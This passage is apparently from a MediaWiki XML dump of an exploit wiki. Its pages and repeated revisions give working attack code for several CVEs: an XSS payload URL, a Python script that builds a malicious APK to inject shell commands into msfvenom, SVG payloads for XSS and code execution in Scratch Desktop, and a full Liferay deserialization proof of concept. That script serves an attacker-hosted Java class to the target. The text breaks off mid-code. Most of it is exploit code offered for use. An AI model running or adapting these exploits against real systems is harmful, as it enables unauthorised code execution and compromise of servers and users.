      <format>text/x-wiki</format>
      <text bytes="130" sha1="7wmigzmezz32tk66swt649q0hh530da" xml:space="preserve">==POC==
&lt;pre&gt;
/PolicyMgmt/policyDetailsCard.do?poID=19&amp;typeID=3&amp;prodID=%27%22%3E%3Csvg%2fonload%3daIert(document.domain)%3E
&lt;/pre&gt;</text>
      <sha1>7wmigzmezz32tk66swt649q0hh530da</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7384 msfvenom APK模板命令注入</title>
    <ns>0</ns>
    <id>1562</id>
    <revision>
      <id>1947</id>
      <timestamp>2021-04-30T06:38:57Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "  ## Info  [CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7384)   ## EXP  &lt;pre&gt; # Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template c..."</comment>
      <origin>1947</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1890" sha1="aj2hijnzkq91ebei1vu7owubcw82xql" xml:space="preserve">

## Info

[CVE-2020-7384](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7384)


## EXP

&lt;pre&gt;
# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'echo "Code execution as $(id)" &gt; /tmp/win'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
            
&lt;/pre&gt;


## Source</text>
      <sha1>aj2hijnzkq91ebei1vu7owubcw82xql</sha1>
    </revision>
    <revision>
      <id>1948</id>
      <parentid>1947</parentid>
      <timestamp>2021-04-30T06:41:58Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <origin>1948</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1961" sha1="17khnoafwmbn63lodt0npebtqmm7u7u" xml:space="preserve">=== Info: ===
[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7384 CVE-2020-7384]

=== EXP: ===
&lt;pre&gt;
# Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection
# Exploit Author: Justin Steven
# Vendor Homepage: https://www.metasploit.com/
# Software Link: https://www.metasploit.com/
# Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0
# CVE : CVE-2020-7384

#!/usr/bin/env python3
import subprocess
import tempfile
import os
from base64 import b64encode

# Change me
payload = 'echo "Code execution as $(id)" &gt; /tmp/win'

# b64encode to avoid badchars (keytool is picky)
payload_b64 = b64encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b64} | base64 -d | sh #"

print(f"[+] Manufacturing evil apkfile")
print(f"Payload: {payload}")
print(f"-dname: {dname}")
print()

tmpdir = tempfile.mkdtemp()
apk_file = os.path.join(tmpdir, "evil.apk")
empty_file = os.path.join(tmpdir, "empty")
keystore_file = os.path.join(tmpdir, "signing.keystore")
storepass = keypass = "password"
key_alias = "signing.key"

# Touch empty_file
open(empty_file, "w").close()

# Create apk_file
subprocess.check_call(["zip", "-j", apk_file, empty_file])

# Generate signing key with malicious -dname
subprocess.check_call(["keytool", "-genkey", "-keystore", keystore_file, "-alias", key_alias, "-storepass", storepass,
                       "-keypass", keypass, "-keyalg", "RSA", "-keysize", "2048", "-dname", dname])

# Sign APK using our malicious dname
subprocess.check_call(["jarsigner", "-sigalg", "SHA1withRSA", "-digestalg", "SHA1", "-keystore", keystore_file,
                       "-storepass", storepass, "-keypass", keypass, apk_file, key_alias])

print()
print(f"[+] Done! apkfile is at {apk_file}")
print(f"Do: msfvenom -x {apk_file} -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null")
            
&lt;/pre&gt;

=== Source ===
[https://www.exploit-db.com/exploits/49491 Exploit-db-49491]</text>
      <sha1>17khnoafwmbn63lodt0npebtqmm7u7u</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7750 Scratch Desktop 3.17 XSS&amp;RCE漏洞</title>
    <ns>0</ns>
    <id>5378</id>
    <revision>
      <id>6170</id>
      <timestamp>2021-07-03T01:54:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: 3.10.2 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: Scratch Desktop 3.17 - Cross-Site Scripting/Remote Code Ex..."</comment>
      <origin>6170</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2446" sha1="gq78xae3tdnrlo6acbg0ewywxwrzt4n" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: 3.10.2
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Scratch Desktop 3.17 - Cross-Site Scripting/Remote Code Execution (XSS/RCE)
# Google Dork: 'inurl:"/projects/editor/?tutorial=getStarted" -mit.edu' (not foolproof on versioning)
# Date: 2021-06-18
# Exploit Author: Stig Magnus Baugstø
# Vendor Homepage: https://scratch.mit.edu/
# Software Link: https://web.archive.org/web/20210225011334/https://downloads.scratch.mit.edu/desktop/Scratch%20Desktop%20Setup%203.10.2.exe
# Version: 3.10.2
# Tested on: Windows 10 x64, but should be platform independent.
# CVE: CVE-2020-7750

Scratch cross-site scripting (XSS) &amp; Scratch Desktop remote code execution (XSS/RCE) &lt;3.17.1 / scratch-svg-renderer &lt;0.2.0-prerelease.20201019174008

CVE-2020-7750 was disclosed on Scratch's official forums on 21th of October 2020 by the forum user apple502j. The forum thread describes a cross-site scripting (XSS) vulnerability in Scratch and Scratch Desktop prior to 3.17.1: https://scratch.mit.edu/discuss/topic/449794/

You can exploit the vulnerability by uploading a SVG (*.svg) file WITHOUT the viewBox attribute and embedding a malicious event handler. Example:

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="&lt;INSERT JS PAYLOAD&gt;" /&gt;
	&lt;/svg&gt;

The malicious SVG can be uploaded as a sprite or stored within a Scratch project file (*.sb3), which is a regular ZIP archive by the way.

Example of regular cross-site scripting (XSS):

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="alert('Pwned!')" /&gt;
	&lt;/svg&gt;

The Scratch Desktop versions runs on Electron where the exploit can be used for remote code execution (RCE):

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="require('electron').shell.openExternal('cmd.exe')" /&gt;
	&lt;/svg&gt;

The example above launches cmd.exe (Command Prompt) on Windows.

For a full walkthrough and explanation of the exploit, please see the following blog post by the exploit's author: https://www.mnemonic.no/blog/exploiting-scratch-with-a-malicious-image/

Note that the author of this exploit does not take credit for finding the vulnerability. The vulnerability was disclosed by user apple502j on Scratch's official forums.
&lt;/pre&gt;</text>
      <sha1>gq78xae3tdnrlo6acbg0ewywxwrzt4n</sha1>
    </revision>
    <revision>
      <id>6171</id>
      <parentid>6170</parentid>
      <timestamp>2021-07-03T01:54:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6171</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2457" sha1="66he9ltqtat79u6x8e1u9upxp600g0d" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: 3.10.2
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: Scratch Desktop 3.17 - Cross-Site Scripting/Remote Code Execution (XSS/RCE)
# Google Dork: 'inurl:"/projects/editor/?tutorial=getStarted" -mit.edu' (not foolproof on versioning)
# Date: 2021-06-18
# Exploit Author: Stig Magnus Baugstø
# Vendor Homepage: https://scratch.mit.edu/
# Software Link: https://web.archive.org/web/20210225011334/https://downloads.scratch.mit.edu/desktop/Scratch%20Desktop%20Setup%203.10.2.exe
# Version: 3.10.2
# Tested on: Windows 10 x64, but should be platform independent.
# CVE: CVE-2020-7750

Scratch cross-site scripting (XSS) &amp; Scratch Desktop remote code execution (XSS/RCE) &lt;3.17.1 / scratch-svg-renderer &lt;0.2.0-prerelease.20201019174008

CVE-2020-7750 was disclosed on Scratch's official forums on 21th of October 2020 by the forum user apple502j. The forum thread describes a cross-site scripting (XSS) vulnerability in Scratch and Scratch Desktop prior to 3.17.1: https://scratch.mit.edu/discuss/topic/449794/

You can exploit the vulnerability by uploading a SVG (*.svg) file WITHOUT the viewBox attribute and embedding a malicious event handler. Example:

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="&lt;INSERT JS PAYLOAD&gt;" /&gt;
	&lt;/svg&gt;

The malicious SVG can be uploaded as a sprite or stored within a Scratch project file (*.sb3), which is a regular ZIP archive by the way.

Example of regular cross-site scripting (XSS):

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="alert('Pwned!')" /&gt;
	&lt;/svg&gt;

The Scratch Desktop versions runs on Electron where the exploit can be used for remote code execution (RCE):

	&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt;
		&lt;image href="doesNotExist.png" onerror="require('electron').shell.openExternal('cmd.exe')" /&gt;
	&lt;/svg&gt;

The example above launches cmd.exe (Command Prompt) on Windows.

For a full walkthrough and explanation of the exploit, please see the following blog post by the exploit's author: https://www.mnemonic.no/blog/exploiting-scratch-with-a-malicious-image/

Note that the author of this exploit does not take credit for finding the vulnerability. The vulnerability was disclosed by user apple502j on Scratch's official forums.
&lt;/pre&gt;</text>
      <sha1>66he9ltqtat79u6x8e1u9upxp600g0d</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7961 Liferay Portal Json Web Service 反序列化漏洞</title>
    <ns>0</ns>
    <id>4527</id>
    <revision>
      <id>5210</id>
      <timestamp>2021-06-17T00:50:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; &lt;pre&gt; Liferay Portal 6.1.X Liferay Portal 6.2.X Liferay Portal 7.0.X Liferay Portal 7.1.X Liferay Portal 7.2.X &lt;/pre&gt;..."</comment>
      <origin>5210</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8115" sha1="rw9snrbaejrhkibax16ihbqiivypcsd" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
&lt;pre&gt;
Liferay Portal 6.1.X
Liferay Portal 6.2.X
Liferay Portal 7.0.X
Liferay Portal 7.1.X
Liferay Portal 7.2.X
&lt;/pre&gt;

==POC==
&lt;pre&gt;
'''
   Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1
   POC author: mzero
   Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download
   Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research
   Usage: python poc.py -h
   
   Gadget used: C3P0WrapperConnPool
   
   Installation:
   pip install requests
   pip install bs4
   
   Create file LifExp.java with example content:
   public class LifExp {
       static {
       try {
           String[] cmd = {"cmd.exe", "/c", "calc.exe"};
           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
       } catch ( Exception e ) {
           e.printStackTrace();
           }
       }
   }
   javac LifExp.java
   Place poc.py and LifExp.class in the same directory.
'''
import requests
import threading
import time
import sys
import argparse
import binascii
from bs4 import BeautifulSoup
from datetime import datetime
from http.server import BaseHTTPRequestHandler,HTTPServer
#import http.server
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# SET proxy
PROXIES = {}
#PROXIES = {"http":"http://127.0.0.1:9090"}

class HttpHandler(BaseHTTPRequestHandler):
   
   def do_GET(self):
       self.send_response(200)
       self.send_header('Content-type','application/java-vm')
       self.end_headers()
       f = open("LifExp.class", "rb")
       self.wfile.write(f.read())
       f.close()
       return

def log(level, msg):
   prefix = "[#] "
   if level == "error":
       prefix = "[!] "
   d = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
   temp = "{} [{}] {}".format(prefix, d, msg)
   print(temp)

def find_href(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.find_all('a', href=True)
   
def find_class(body, clazz):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("div", {"class": clazz})

def find_id(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("form", {"id": "execute"})

def get_param(div):
   param = ""
   param_type = ""
   p_name = div.find("span", {"class": "lfr-api-param-name"})
   p_type = div.find("span", {"class": "lfr-api-param-type"})
   if p_name:
       param = p_name.text.strip()
   if p_type:
       param_type = p_type.text.strip()
       
   return (param, param_type)

def _do_get(url):
   resp = requests.get(url, proxies=PROXIES, verify=False)
   return resp
   
def do_get(host, path):
   url = "{}/{}".format(host, path)
   resp = _do_get(url)
   return resp
   
def _do_post(url, data):
   resp = requests.post(url, proxies=PROXIES, verify=False, data=data)
   return resp
   
def do_post(host, path, data):
   url = "{}/{}".format(host, path)
   resp = _do_post(url, data)
   return resp
   
def find_endpoints(host, path):
   result = []
   resp = do_get(host, path)
   links = find_href(resp.text)
   for link in links:
       if "java.lang.Object" in link['href']:
           result.append(link['href'])
   return result

def find_parameters(body):
   div_params = find_class(body, "lfr-api-param")
   params = []
   for d in div_params:
       params.append(get_param(d))
   return params

def find_url(body):
   form = find_id(body)[0]
   return form['action']

def set_params(params, payload, payload_type):
   result = {}
   for param in params:
       p_name, p_type = param
       if p_type == "java.lang.Object":
           result[p_name+":"+payload_type] = payload
       
       result[p_name] = "1"
   return result

def pad(data, length):
   return data+"\x20"*(length-len(data))
   
def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE):
   p = set_params(params, PAYLOAD, PAYLOAD_TYPE)
   resp = do_post(host, api_url, p)

banner = """POC author: mzero\r\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research"""

def main():
   print(banner)
   parser = argparse.ArgumentParser()
   parser.add_argument("-t", "--target-host", dest="target", help="target host:port", required=True)
   parser.add_argument("-u", "--api-url", dest="api_url", help="path to jsonws. Default: /api/jsonws", default="api/jsonws")
   parser.add_argument("-p", "--bind-port", dest="bind_port", help="HTTP server bind port. Default 9091", default=9091)
   parser.add_argument("-l", "--bind-ip", dest="bind_ip", help="HTTP server bind IP. Default 127.0.0.1. It can't be 0.0.0.0", default="127.0.0.1")

   args = parser.parse_args()
   bind_port  = int(args.bind_port)
   bind_ip = args.bind_ip
   target_ip = args.target
   api_url = args.api_url
   endpoints = []
   vuln_endpoints = []
   
   PAYLOAD_TYPE = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
   PAYLOAD_PREFIX = """{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8"""
   PAYLOAD_SUFIX = """740003466f6f;"}"""

   INTERNAL = pad("http://{}:{}/".format(bind_ip, bind_port), 200)

   INTERNALB = INTERNAL.encode('utf-8')
   
   INTERNALHEX = binascii.hexlify(INTERNALB)

   PAYLOAD = PAYLOAD_PREFIX+INTERNALHEX.hex()+PAYLOAD_SUFIX
   
   
   try:
       log("info", "Looking for vulnerable endpoints: {}/{}".format(target_ip, api_url))
       endpoints = find_endpoints(target_ip, api_url)
       if not endpoints:
           log("info", "Vulnerable endpoints not found!")
           sys.exit(1)
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
   try:
       server = HTTPServer((bind_ip, bind_port), HttpHandler)
       log("info", "Started HTTP server on {}:{}".format(bind_ip, bind_port))
       th = threading.Thread(target=server.serve_forever)
       th.daemon=True
       th.start()
       
       for e in endpoints:
           resp = do_get(target_ip, e)
           params = find_parameters(resp.text)
           url_temp = find_url(resp.text)
           vuln_endpoints.append((url_temp, params))
       
       for endpoint in vuln_endpoints:
           log("info", "Probably vulnerable endpoint {}.".format(endpoint[0]))
           op = raw_input("Do you want to test it? Y/N: ")
           if op.lower() == "y":
               exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE)
               
       log("info", "CTRL+C to exit :)")
       while True:
           time.sleep(1)
   except KeyboardInterrupt:
       log("info", "Shutting down...")
       server.socket.close()
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
if __name__ == "__main__":
   main()

LifExp.java

public class LifExp {

static {
try {
String[] cmd = {"cmd.exe", "/c", "calc.exe"};
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
&lt;/pre&gt;</text>
      <sha1>rw9snrbaejrhkibax16ihbqiivypcsd</sha1>
    </revision>
    <revision>
      <id>5212</id>
      <parentid>5210</parentid>
      <timestamp>2021-06-17T00:51:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5212</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8126" sha1="axy1nmx0aemv527wfdah3kl3hz36xyt" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Liferay Portal 6.1.X
Liferay Portal 6.2.X
Liferay Portal 7.0.X
Liferay Portal 7.1.X
Liferay Portal 7.2.X
&lt;/pre&gt;

==POC==
&lt;pre&gt;
'''
   Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1
   POC author: mzero
   Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download
   Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research
   Usage: python poc.py -h
   
   Gadget used: C3P0WrapperConnPool
   
   Installation:
   pip install requests
   pip install bs4
   
   Create file LifExp.java with example content:
   public class LifExp {
       static {
       try {
           String[] cmd = {"cmd.exe", "/c", "calc.exe"};
           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
       } catch ( Exception e ) {
           e.printStackTrace();
           }
       }
   }
   javac LifExp.java
   Place poc.py and LifExp.class in the same directory.
'''
import requests
import threading
import time
import sys
import argparse
import binascii
from bs4 import BeautifulSoup
from datetime import datetime
from http.server import BaseHTTPRequestHandler,HTTPServer
#import http.server
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# SET proxy
PROXIES = {}
#PROXIES = {"http":"http://127.0.0.1:9090"}

class HttpHandler(BaseHTTPRequestHandler):
   
   def do_GET(self):
       self.send_response(200)
       self.send_header('Content-type','application/java-vm')
       self.end_headers()
       f = open("LifExp.class", "rb")
       self.wfile.write(f.read())
       f.close()
       return

def log(level, msg):
   prefix = "[#] "
   if level == "error":
       prefix = "[!] "
   d = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
   temp = "{} [{}] {}".format(prefix, d, msg)
   print(temp)

def find_href(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.find_all('a', href=True)
   
def find_class(body, clazz):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("div", {"class": clazz})

def find_id(body):
   soup = BeautifulSoup(body, "html.parser")
   return soup.findAll("form", {"id": "execute"})

def get_param(div):
   param = ""
   param_type = ""
   p_name = div.find("span", {"class": "lfr-api-param-name"})
   p_type = div.find("span", {"class": "lfr-api-param-type"})
   if p_name:
       param = p_name.text.strip()
   if p_type:
       param_type = p_type.text.strip()
       
   return (param, param_type)

def _do_get(url):
   resp = requests.get(url, proxies=PROXIES, verify=False)
   return resp
   
def do_get(host, path):
   url = "{}/{}".format(host, path)
   resp = _do_get(url)
   return resp
   
def _do_post(url, data):
   resp = requests.post(url, proxies=PROXIES, verify=False, data=data)
   return resp
   
def do_post(host, path, data):
   url = "{}/{}".format(host, path)
   resp = _do_post(url, data)
   return resp
   
def find_endpoints(host, path):
   result = []
   resp = do_get(host, path)
   links = find_href(resp.text)
   for link in links:
       if "java.lang.Object" in link['href']:
           result.append(link['href'])
   return result

def find_parameters(body):
   div_params = find_class(body, "lfr-api-param")
   params = []
   for d in div_params:
       params.append(get_param(d))
   return params

def find_url(body):
   form = find_id(body)[0]
   return form['action']

def set_params(params, payload, payload_type):
   result = {}
   for param in params:
       p_name, p_type = param
       if p_type == "java.lang.Object":
           result[p_name+":"+payload_type] = payload
       
       result[p_name] = "1"
   return result

def pad(data, length):
   return data+"\x20"*(length-len(data))
   
def exploit(host, api_url, params, PAYLOAD, PAYLOAD_TYPE):
   p = set_params(params, PAYLOAD, PAYLOAD_TYPE)
   resp = do_post(host, api_url, p)

banner = """POC author: mzero\r\nBased on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research"""

def main():
   print(banner)
   parser = argparse.ArgumentParser()
   parser.add_argument("-t", "--target-host", dest="target", help="target host:port", required=True)
   parser.add_argument("-u", "--api-url", dest="api_url", help="path to jsonws. Default: /api/jsonws", default="api/jsonws")
   parser.add_argument("-p", "--bind-port", dest="bind_port", help="HTTP server bind port. Default 9091", default=9091)
   parser.add_argument("-l", "--bind-ip", dest="bind_ip", help="HTTP server bind IP. Default 127.0.0.1. It can't be 0.0.0.0", default="127.0.0.1")

   args = parser.parse_args()
   bind_port  = int(args.bind_port)
   bind_ip = args.bind_ip
   target_ip = args.target
   api_url = args.api_url
   endpoints = []
   vuln_endpoints = []
   
   PAYLOAD_TYPE = "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
   PAYLOAD_PREFIX = """{"userOverridesAsString":"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400064c69664578707400c8"""
   PAYLOAD_SUFIX = """740003466f6f;"}"""

   INTERNAL = pad("http://{}:{}/".format(bind_ip, bind_port), 200)

   INTERNALB = INTERNAL.encode('utf-8')
   
   INTERNALHEX = binascii.hexlify(INTERNALB)

   PAYLOAD = PAYLOAD_PREFIX+INTERNALHEX.hex()+PAYLOAD_SUFIX
   
   
   try:
       log("info", "Looking for vulnerable endpoints: {}/{}".format(target_ip, api_url))
       endpoints = find_endpoints(target_ip, api_url)
       if not endpoints:
           log("info", "Vulnerable endpoints not found!")
           sys.exit(1)
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
   try:
       server = HTTPServer((bind_ip, bind_port), HttpHandler)
       log("info", "Started HTTP server on {}:{}".format(bind_ip, bind_port))
       th = threading.Thread(target=server.serve_forever)
       th.daemon=True
       th.start()
       
       for e in endpoints:
           resp = do_get(target_ip, e)
           params = find_parameters(resp.text)
           url_temp = find_url(resp.text)
           vuln_endpoints.append((url_temp, params))
       
       for endpoint in vuln_endpoints:
           log("info", "Probably vulnerable endpoint {}.".format(endpoint[0]))
           op = raw_input("Do you want to test it? Y/N: ")
           if op.lower() == "y":
               exploit(target_ip, endpoint[0], endpoint[1], PAYLOAD, PAYLOAD_TYPE)
               
       log("info", "CTRL+C to exit :)")
       while True:
           time.sleep(1)
   except KeyboardInterrupt:
       log("info", "Shutting down...")
       server.socket.close()
   except Exception as ex:
       log("error", "An error occured:")
       print(ex)
       sys.exit(1)
   
if __name__ == "__main__":
   main()

LifExp.java

public class LifExp {

static {
try {
String[] cmd = {"cmd.exe", "/c", "calc.exe"};
java.lang.Runtime.getRuntime().exec(cmd).waitFor();
} catch ( Exception e ) {
e.printStackTrace();
}
}
}
&lt;/pre&gt;</text>
      <sha1>axy1nmx0aemv527wfdah3kl3hz36xyt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-7961 Liferay Portal Json Web Service 反序列化漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4533</id>
    <revision>
      <id>5217</id>
      <timestamp>2021-06-17T00:53:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影响=="</comment>
      <origin>5217</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8090" sha1="d17h2aufafi7f4eykvg4mf17h85d0p7" xml:space="preserve">&lt;languages /&gt;
==漏洞影响==
&lt;pre&gt;
Liferay Portal 6.1.X
Liferay Portal 6.2.X
Liferay Portal 7.0.X
Liferay Portal 7.1.X
Liferay Portal 7.2.X
&lt;/pre&gt;

==POC==
&lt;pre&gt;
'''
   Title: POC for Unauthenticated Remote code execution via JSONWS (LPS-97029/CVE-2020-7961) in Liferay 7.2.0 CE GA1
   POC author: mzero
   Download link: https://sourceforge.net/projects/lportal/files/Liferay%20Portal/7.2.0%20GA1/liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.7z/download
   Based on https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html research
   Usage: python poc.py -h
   
   Gadget used: C3P0WrapperConnPool
   
   Installation:
   pip install requests
   pip install bs4
   
   Create file LifExp.java with example content:
   public class LifExp {
       static {
       try {
           String[] cmd = {"cmd.exe", "/c", "calc.exe"};
           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
       } catch ( Exception e ) {
           e.printStackTrace();
           }
       }
   }
   javac LifExp.java
   Place poc.py and LifExp.class in the same directory.
'''
import requests
import threading
import time
import sys
import argparse
import binascii
from bs4 import BeautifulSoup
from datetime import datetime
from http.server import BaseHTTPRequestHandler,HTTPServer
#import http.server
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# SET proxy
PROXIES = {}
#PROXIES = {"http":"http://127.0.0.1:9090"}

class HttpHandler(BaseHTTPRequestHandler):
   
   def do_GET(self):
       self.send_response(200)
